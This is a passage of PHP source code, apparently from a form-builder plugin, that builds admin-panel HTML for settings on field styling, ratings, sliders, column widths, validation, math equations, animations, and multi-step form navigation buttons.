											$output .= '<button class="btn btn-default waves-effect waves-light repeat-x" type="button" title="Repeat X"><i class="fa fa-arrows-h"></i></button>';
											$output .= '<button class="btn btn-default waves-effect waves-light repeat-y" type="button" title="Repeat Y"><i class="fa fa-arrows-v"></i></button>';
											$output .= '<button class="btn btn-default waves-effect waves-light no-repeat" type="button" title="None"><span class="icon-text">No</span></button>';
										$output .= '</div>';
	/*** Background position ***/									
										$output .= '<div role="group" class="btn-group bg-position">';
											$output .= '<small>Position</small>';
											$output .= '<button class="btn btn-default waves-effect waves-light left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
											$output .= '<button class="btn btn-default waves-effect waves-light center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
											$output .= '<button class="btn btn-default waves-effect waves-light right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
										$output .= '</div>';
									
									$output .= '</div>';
								
								$output .= '</div>';
	
	/**** THUMB RATING SETTINGS ****/
								$output .= '<div class="setting-wrapper settings-thumb-rating">';	
									$output .= '<div role="toolbar" class="btn-toolbar col-2">';
										
											$output .= '<div class="input-group input-group-sm">';
											$output .= '<small>Thumbs Up</small>';
		/*** Thumbs Up ***/
											$output .= '<input type="text" class="form-control" name="set_thumbs_up_val" placeholder="Yes" id="set_thumbs_up_val">';
										$output .= '</div>';
										
										
											$output .= '<div class="input-group input-group-sm">';
											$output .= '<small>Thumbs Down</small>';
		/*** Thumbs down ***/
											$output .= '<input type="text" class="form-control" name="set_thumbs_down_val" placeholder="No" id="set_thumbs_down_val">';
										$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
	/**** SMILY RATING SETTINGS ****/
								$output .= '<div class="setting-wrapper settings-smily-rating">';	
									$output .= '<div role="toolbar" class="btn-toolbar col-3">';
										
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Bad</small>';
	/*** Frown ***/
										$output .= '<input type="text" class="form-control" name="set_smily_frown_val" placeholder="Bad" id="set_smily_frown_val">';
									$output .= '</div>';
								
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Average</small>';
										$output .= '<input type="text" class="form-control" name="set_smily_average_val" placeholder="Average" id="set_smily_average_val">';
									$output .= '</div>';
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Good</small>';
	/*** Smile ***/
										$output .= '<input type="text" class="form-control" name="set_smily_good_val" placeholder="Good" id="set_smily_good_val">';
										$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
									
									
							
	/**** STAR RATING SETTINGS ****/
								$output .= '<div class="setting-wrapper settings-star-rating">';	
									$output .= '<div role="toolbar" class="btn-toolbar col-2">';
										
											$output .= '<div class="input-group input-group-sm">';
											$output .= '<small>Stars</small>';
		/*** Total Stars ***/
											$output .= '<input type="text" class="form-control" name="total_stars" placeholder="Total stars" id="total_stars">';
										$output .= '</div>';
										
										
											$output .= '<div class="input-group input-group-sm">';
											$output .= '<small>Enable half stars</small>';
		/*** Half star ***/
												$output .= '<select class="form-control" name="set_half_stars">
																	 		<option value="no">No</option>
																			<option value="yes">Yes</option>
																		</select>';
										$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
		
		
											$output .= '<div role="toolbar" class="btn-toolbar survey-field-settings">';
												$output .= '<div role="group" class="btn-group align-input-container">';
													$output .= '<small>Alignment</small>';
													$output .= '<button class="btn btn-default waves-effect waves-light left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
													$output .= '<button class="btn btn-default waves-effect waves-light center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
													$output .= '<button class="btn btn-default waves-effect waves-light right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
												$output .= '</div>';
				/*** Input size ***/
												/*$output .= '<div role="group" class="btn-group set-icon-size">';
													$output .= '<small>Size</small>';
													$output .= '<button class="btn btn-default waves-effect waves-light small" type="button" title="Small"><i class="fa fa-font" style="font-size:10px"></i></button>';
													$output .= '<button class="btn btn-default waves-effect waves-light normal" type="button" title="Normal"><i class="fa fa-font" style="font-size:13px"></i></button>';
													$output .= '<button class="btn btn-default waves-effect waves-light large" type="button" title="Large"><i class="fa fa-font" style="font-size:16px"></i></button>';
												$output .= '</div>';*/
											$output .= '</div>';
		
		
		/**** SLIDER SETTINGS ****/
								$output .= '<div class="setting-wrapper settings-slider-options">';	
										
											$output .= '<div role="toolbar" class="btn-toolbar col-4">';
				/*** Start Value ***/	
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Starting value</small>';
													$output .= '<input type="text" class="form-control" name="start_value" id="start_value"  placeholder="Enter start value">';
												$output .= '</div>';
				/*** Min Value ***/
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Minimum Value</small>';
													$output .= '<input type="text" class="form-control" name="minimum_value" id="minimum_value"  placeholder="Enter min value">';
												$output .= '</div>';
				/*** Max Value ***/							
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Maximum Value</small>';
													$output .= '<input type="text" class="form-control" name="maximum_value" id="maximum_value"  placeholder="Enter max value">';
												$output .= '</div>';
				/*** Step Value ***/							
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Step Value</small>';
													$output .= '<input type="text" class="form-control" name="step_value" id="step_value"  placeholder="Enter step value">';
												$output .= '</div>';
											
										$output .= '</div>';
										
								$output .= '</div>';
			/**** SLIDER SETTINGS ****/
				
									
						
										$output .= '<div class="col-sm-12 settings-grid-system settings-col-1">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 1 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-1-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 settings-grid-system settings-col-2">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 2 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-2-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 settings-grid-system settings-col-3">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 3 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-3-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 settings-grid-system settings-col-4">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 4 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-4-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 settings-grid-system settings-col-5">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 5 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-5-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 settings-grid-system settings-col-6">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 6 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-6-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
							
							

						
					
			$output .= '</div>';
								
					
					
					
					
					
					
					
					
					
					
					
					$output .= '</div>';
					
						

//VALIDATION SETTINGS //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////				
							$output .= '<div class="validation-settings settings-section" style="display:none;">';
								
								$output .= '<div role="toolbar" class="btn-toolbar col-2">';
	/*** Required ***/	
									$output .= '
																	<div class="btn-group required">
																		<small>Required</small>
																		<button class="btn btn-default waves-effect waves-light btn-sm yes" type="button"><span class="fa fa-check"></span></button>
																		<button class="btn btn-default waves-effect waves-light btn-sm no active" type="button">&nbsp;<span class="fa fa-remove"></span></button>
																	  </div>
																	<div class="btn-group required-star">
																		<small>Indicator</small>
																		<button class="btn btn-default waves-effect waves-light btn-sm full active" type="button">&nbsp;<span class="glyphicon glyphicon-star"></span>&nbsp;</button>
																		<button class="btn btn-default waves-effect waves-light btn-sm empty" type="button">&nbsp;<span class="glyphicon glyphicon-star-empty"></span>&nbsp;</button>
																	  	<button class="btn btn-default waves-effect waves-light btn-sm asterisk" type="button">&nbsp;<span class="glyphicon glyphicon-asterisk"></span>&nbsp;</button>
																		<button class="btn btn-default waves-effect waves-light btn-sm none" type="button">&nbsp;<span class="fa fa-eye-slash"></span></button>
																	  </div>
																	 <div class="input-group input-group-sm"><small>Validate As</small>
																		<select class="form-control" name="validate-as">
																	 		<option value="" selected="selected">Any Format</option>
																			<option value="email">Email</option>
																			<option value="url">URL</option>
																			<option value="phone_number">Phone Number</option>
																			<option value="numbers_only">Numbers Only</option>
																			<option value="text_only">Text Only</option>
																		</select>
																	 </div> 
																	  ';
									$output .= '</div>';
									
									$output .= '<div role="toolbar" class="btn-toolbar col-2">';
	/*** Error Messsage ***/	
									$output .= '
											 <div class="input-group input-group-sm"><small>Error Message</small>
												<input type="text" placeholder="Error Message" id="the_error_mesage" name="the_error_mesage" class="form-control">
												
											 </div> 
											  <div class="input-group input-group-sm"><small>Secondary Error Message</small>
												<input type="text" placeholder="Enter Secondary Message" id="set_secondary_error" name="set_secondary_error" class="form-control">
											 </div> 
											  ';
									$output .= '</div>';
									
									$output .= '<div role="toolbar" class="btn-toolbar col-2 max-min-settings">';
	/*** MAX MIN ***/	
									$output .= '
											 <div class="input-group input-group-sm"><small>Maximum Characters</small>
												<input type="text" placeholder="Enter maximum allowed characters" id="set_max_val" name="set_max_val" class="form-control">
												
											 </div> 
											  <div class="input-group input-group-sm"><small>Minimum Characters</small>
												<input type="text" placeholder="Enter minimum allowed characters" id="set_min_val" name="set_min_val" class="form-control">
											 </div> 
											  ';
									$output .= '</div>';
									$output .= '<div class="multi-upload-validation-settings" style="display:none;">';
										$output .= '<div role="toolbar" class="btn-toolbar col-2">';
		/*** Multi Uploader Messsages ***/	
										$output .= '
												 <div class="input-group input-group-sm"><small>Set Max File Size per File</small>
													<input type="text" placeholder="Set max file size per file in MB (0=unlimited)" id="max_file_size_pf" name="max_file_size_pf" class="form-control">
												 </div> 
												  <div class="input-group input-group-sm"><small>Error Message exceeding max file size p/file</small>
													<input type="text" placeholder="Message if max size is exceeded per file" id="max_file_size_pf_error" name="max_file_size_pf_error" class="form-control">
												 </div> 
												  ';
										$output .= '</div>';
										$output .= '<div role="toolbar" class="btn-toolbar col-2">';
		/*** Multi Uploader Messsages ***/	
										$output .= '
												 <div class="input-group input-group-sm"><small>Set Max Size for all Files</small>
													<input type="text" placeholder="Set max size for all files in MB (0=unlimited)" id="max_file_size_af" name="max_file_size_af" class="form-control">
												 </div> 
												  <div class="input-group input-group-sm"><small>Error Message exceeding Size of all Files</small>
													<input type="text" placeholder="Message if size of all files are exceeded" id="max_file_size_af_error" name="max_file_size_af_error" class="form-control">
												 </div> 
												  ';
										$output .= '</div>';
										$output .= '<div role="toolbar" class="btn-toolbar col-2">';
		/*** Multi Uploader Messsages ***/	
										$output .= '
												 <div class="input-group input-group-sm"><small>Set File Upload Limit</small>
													<input type="text" placeholder="Set max files that can be uploaded (0=unlimited)" id="max_upload_limit" name="max_upload_limit" class="form-control">
												 </div> 
												  <div class="input-group input-group-sm"><small>Error Message exceding max file upload limit</small>
													<input type="text" placeholder="Message if upload limit is exceeded" id="max_upload_limit_error" name="max_upload_limit_error" class="form-control">
												 </div> 
												  ';
										$output .= '</div>';
										
										
										
									$output .= '</div>';
									$output .= '<div class="uploader-settings" style="display:none;">';
									
										$output .= '<small>Allowed Extentions</small><textarea class="form-control" name="set_extensions" id="set_extensions"></textarea>';
									$output .= '</div>';
								$output .= '</div>';

//MATH SETTINGS //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////				
							$output .= '<div class="math-settings settings-section">';
								$output .= '<div role="toolbar" class="btn-toolbar col-3">';
	/*** Input Placeholder ***/	;
	/*** Input Name ***/
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Form fields</small>';
										$output .= '<select class="form-control" name="math_fields"></select>';
									$output .= '</div>';
	/*** Input ID ***/							
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Math Result Name</small>';
										$output .= '<input type="text" class="form-control" name="set_math_input_name" id="set_math_input_name"  placeholder="Unique Identifier">';
									$output .= '</div>';
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Decimal Places</small>';
										$output .= '<input type="text" class="form-control" name="set_decimals" id="set_decimals"  placeholder="Set result decimal places">';
									$output .= '</div>';
									/*$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Input Class</small>';
										$output .= '<input type="text" class="form-control" name="set_input_class" id="set_input_class"  placeholder="Set class">';
									$output .= '</div>';*/
								$output .= '</div>';
								$output .= '<small>Math Equation</small><textarea class="form-control" name="set_math_logic_equation" id="set_math_logic_equation"></textarea>';
							$output .= '</div>';
						
//ANIMATION SETTINGS //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////				
							$output .= '<div class="animation-settings settings-section" style="display:none;">';
								
								$output .= '<div role="toolbar" class="btn-toolbar col-2">';
	/*** Animation Selection ***/	
									$output .= ' <div class="input-group input-group-sm"><small>Animation</small>
														<select id="field_animation" class="form-control" name="field_animation">
															  <option selected="selected" value="no_animation">No Animation</option>
																	<optgroup label="Attention Seekers">
																	  <option value="bounce">bounce</option>
																	  <option value="flash">flash</option>
																	  <option value="pulse">pulse</option>
																	  <option value="rubberBand">rubberBand</option>
																	  <option value="shake">shake</option>
																	  <option value="swing">swing</option>
																	  <option value="tada">tada</option>
																	  <option value="wobble">wobble</option>
																	  <option value="jello">jello</option>
																	</optgroup>
															
																	<optgroup label="Bouncing Entrances">
																	  <option value="bounceIn">bounceIn</option>
																	  <option value="bounceInDown">bounceInDown</option>
																	  <option value="bounceInLeft">bounceInLeft</option>
																	  <option value="bounceInRight">bounceInRight</option>
																	  <option value="bounceInUp">bounceInUp</option>
																	</optgroup>
													
															<optgroup label="Bouncing Exits">
															  <option value="bounceOut">bounceOut</option>
															  <option value="bounceOutDown">bounceOutDown</option>
															  <option value="bounceOutLeft">bounceOutLeft</option>
															  <option value="bounceOutRight">bounceOutRight</option>
															  <option value="bounceOutUp">bounceOutUp</option>
															</optgroup>
													
															<optgroup label="Fading Entrances">
															  <option value="fadeIn">fadeIn</option>
															  <option value="fadeInDown">fadeInDown</option>
															  <option value="fadeInDownBig">fadeInDownBig</option>
															  <option value="fadeInLeft">fadeInLeft</option>
															  <option value="fadeInLeftBig">fadeInLeftBig</option>
															  <option value="fadeInRight">fadeInRight</option>
															  <option value="fadeInRightBig">fadeInRightBig</option>
															  <option value="fadeInUp">fadeInUp</option>
															  <option value="fadeInUpBig">fadeInUpBig</option>
															</optgroup>
													
															<optgroup label="Fading Exits">
															  <option value="fadeOut">fadeOut</option>
															  <option value="fadeOutDown">fadeOutDown</option>
															  <option value="fadeOutDownBig">fadeOutDownBig</option>
															  <option value="fadeOutLeft">fadeOutLeft</option>
															  <option value="fadeOutLeftBig">fadeOutLeftBig</option>
															  <option value="fadeOutRight">fadeOutRight</option>
															  <option value="fadeOutRightBig">fadeOutRightBig</option>
															  <option value="fadeOutUp">fadeOutUp</option>
															  <option value="fadeOutUpBig">fadeOutUpBig</option>
															</optgroup>
													
															<optgroup label="Flippers">
															  <option value="flip">flip</option>
															  <option value="flipInX">flipInX</option>
															  <option value="flipInY">flipInY</option>
															  <option value="flipOutX">flipOutX</option>
															  <option value="flipOutY">flipOutY</option>
															</optgroup>
													
															<optgroup label="Lightspeed">
															  <option value="lightSpeedIn">lightSpeedIn</option>
															  <option value="lightSpeedOut">lightSpeedOut</option>
															</optgroup>
													
															<optgroup label="Rotating Entrances">
															  <option value="rotateIn">rotateIn</option>
															  <option value="rotateInDownLeft">rotateInDownLeft</option>
															  <option value="rotateInDownRight">rotateInDownRight</option>
															  <option value="rotateInUpLeft">rotateInUpLeft</option>
															  <option value="rotateInUpRight">rotateInUpRight</option>
															</optgroup>
													
															<optgroup label="Rotating Exits">
															  <option value="rotateOut">rotateOut</option>
															  <option value="rotateOutDownLeft">rotateOutDownLeft</option>
															  <option value="rotateOutDownRight">rotateOutDownRight</option>
															  <option value="rotateOutUpLeft">rotateOutUpLeft</option>
															  <option value="rotateOutUpRight">rotateOutUpRight</option>
															</optgroup>
													
															<optgroup label="Sliding Entrances">
															  <option value="slideInUp">slideInUp</option>
															  <option value="slideInDown">slideInDown</option>
															  <option value="slideInLeft">slideInLeft</option>
															  <option value="slideInRight">slideInRight</option>
													
															</optgroup>
															<optgroup label="Sliding Exits">
															  <option value="slideOutUp">slideOutUp</option>
															  <option value="slideOutDown">slideOutDown</option>
															  <option value="slideOutLeft">slideOutLeft</option>
															  <option value="slideOutRight">slideOutRight</option>
															  
															</optgroup>
															
															<optgroup label="Zoom Entrances">
															  <option value="zoomIn">zoomIn</option>
															  <option value="zoomInDown">zoomInDown</option>
															  <option value="zoomInLeft">zoomInLeft</option>
															  <option value="zoomInRight">zoomInRight</option>
															  <option value="zoomInUp">zoomInUp</option>
															</optgroup>
															
															<optgroup label="Zoom Exits">
															  <option value="zoomOut">zoomOut</option>
															  <option value="zoomOutDown">zoomOutDown</option>
															  <option value="zoomOutLeft">zoomOutLeft</option>
															  <option value="zoomOutRight">zoomOutRight</option>
															  <option value="zoomOutUp">zoomOutUp</option>
															</optgroup>
													
															<optgroup label="Specials">
															  <option value="hinge">hinge</option>
															  <option value="rollIn">rollIn</option>
															  <option value="rollOut">rollOut</option>
															</optgroup>
														  </select><br />
														  <small>Animation Delay</small>
														 <input type="text" class="form-control" name="animation_delay" placeholder="Set delay in seconds" id="animation_delay"><br />
														 <small>Animation Duration</small>
														 <input type="text" class="form-control" name="animation_duration" placeholder="Set duration in seconds" id="animation_duration">
													 </div> 
													  <div class="input-group input-group-sm"><small>Animation Preview</small>
												<div class="animation_preview_container"><div class="animation_preview">Animation</div></div>
											 </div> 
													  ';
									$output .= '</div>';
									
									
									
								
								$output .= '</div>';						
						
							
						$output .= '</div>';
					
					
					
					
					
					$output .= '</div>';
					
				$output .= '</div>';
				
				
				
				
				
			$output .= '</div>';
			
			
			
						$output .= '<div class="fa-icons-list">';
							$output .= '<div class="row">';
								$output .= '<div class="col-xs-10">';
									$output .= '<div role="group" class="input-group input-group-sm">';
										$output .= '<input type="text" placeholder="Search Icons" class="icon_search form-control" name="icon_search" id="icon_search">';
										$output .= '<span class="input-group-addon"><span class="fa fa-search"></span></span>';
									$output .= '</div>';
								$output .= '</div>';
								$output .= '<div class="col-xs-2">';
									$output .= '<span class="close_icons fa fa-close"></span>';
								$output .= '</div>';
							$output .= '</div>';
							$output .= '<div class="inner">';
								$get_icons = new NF5_icons();
								$output .= $get_icons->get_fa_icons();
							$output .= '</div>';
						$output .= '</div>';
			
			return $output;
		
		}
		
		
		public function print_form_canvas(){
			
			$output = '';
			
			$output .= '<div class="step_controls material_box">';
				$output .= '<div class="material_box_content">';
					$output .= '<div class="field form_field custom-fields grid step ui-draggable ui-draggable-handle">
														  <div class="draggable_object waves-effect waves-light">Add New Multi-Step</div>
														  <div style="display:none;" class="form_object" id="form_object">
															<div data-svg="demo-input-1" class="input-inner">
															  <div class="row">
																<div class="col-sm-12">
																  <div class="tab-pane grid-system grid-system panel panel-default">
																	<div class="zero-clipboard"><span class="btn-clipboard btn-clipboard-hover"><span class="badge the_step_number">Step</span>&nbsp;
																	  <div title="Delete field" class="btn btn-default btn-sm delete "><i class="glyphicon glyphicon-remove"></i></div>
																	  </span></div>
																	<div class="panel-body">
																	
																	
																	<div class="form_field grid grid-system grid-system-2 ui-draggable ui-draggable-handle nex_prev_steps" style="visibility: visible; display: block;" id="_31692"><div class="draggable_object waves-effect waves-light" style="display: none;"><span class="col-badge">2</span> Columns</div><div id="form_object" class="form_object" style=""><div class="input-inner" data-svg="demo-input-1"><div class="row grid_row"><div class="grid_input_holder col-xs-6"><div class="panel grid-system panel-default"><div class="panel-body ui-droppable ui-sortable"><div class="form_field all_fields  submit-button button_fields common_fields preset_fields special_fields selection_fields  ui-draggable ui-draggable-handle dropped" style="position: relative; top: 0px; left: 0px; z-index: 10000000;" id="_99527">
														  <div class="draggable_object waves-effect waves-light" style="display: none;"><i class="fa fa-backward" data-toggle="tooltip" title="" data-original-title="Back Button"></i></div>
														  <div style="" class="form_object" id="form_object">
															<div class="row">
															  <div id="field_container" class="col-sm-12">
																<div class="row">
																  <div class="col-sm-12  input_container">
																	<button class="prev-step svg_ready the_input_element btn btn-default">Back</button>
																  </div>
																</div>
															  </div>
															  <div style="display: none;" class="field_settings">
																<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>
																<div title="Edit Field Attributes" class="btn btn-default btn-xs edit"><i class="fa fa-edit"></i></div>
																<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>
																<div title="Delete field" class="btn btn-default btn-xs delete"><i class="fa fa-close"></i></div>
															  </div>
															</div>
														  </div>
														</div></div></div></div><div class="grid_input_holder col-xs-6"><div class="panel grid-system panel-default"><div class="panel-body ui-droppable ui-sortable"><div class="form_field all_fields  submit-button button_fields common_fields preset_fields special_fields selection_fields  ui-draggable ui-draggable-handle dropped" style="position: relative; top: 0px; left: 0px; z-index: 10000000;" id="_80193">
														  <div class="draggable_object " style="display: none;"><i class="fa fa-forward" data-toggle="tooltip" title="" data-original-title="Next Button"></i></div>
														  <div style="" class="form_object" id="form_object">
															<div class="row">
															  <div id="field_container" class="col-sm-12">
																<div class="row">
																  <div class="col-sm-12  input_container align_right">
																	<button class="nex-step svg_ready the_input_element btn btn-default">Next</button>
																  </div>
																</div>
															  </div>
															  <div style="display: none;" class="field_settings">
																<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>
																<div title="Edit Field Attributes" class="btn btn-default btn-xs edit"><i class="fa fa-edit"></i></div>
																<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>
																<div title="Delete field" class="btn btn-default btn-xs delete"><i class="fa fa-close"></i></div>
															  </div>
															</div>
														  </div>
														</div></div></div></div></div><div class="field_settings grid" style="display: none;"><div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div><div class="btn btn-default btn-xs edit" title="Edit Field Attributes"><i class="fa fa-edit"></i></div><div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div><div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div></div></div></div></div>
																	
																	
																	
																	</div>
																  </div>
																</div>
															  </div>
															</div>
														  </div>
														</div>';
										
										
										$output .= '<div class="field form_field all_fields  submit-button button_fields common_fields preset_fields special_fields selection_fields  ui-draggable ui-draggable-handle">
														  <div class="draggable_object "><i class="fa fa-backward" data-toggle="tooltip" title="" data-original-title="Back Button"></i></div>
														  <div style="display:none;" class="form_object" id="form_object">
															<div class="row">
															  <div id="field_container" class="col-sm-12">
																<div class="row">
																  <div class="col-sm-12  input_container">
																	<button class="prev-step svg_ready the_input_element btn btn-default">Back</button>
																  </div>
																</div>
															  </div>
															  <div style="display:none" class="field_settings">
																<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>
																<div title="Edit Field Attributes" class="btn btn-default btn-xs edit"><i class="fa fa-edit"></i></div>
																<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>
																<div title="Delete field" class="btn btn-default btn-xs delete"><i class="fa fa-close"></i></div>
															  </div>
															</div>
														  </div>
														</div>';
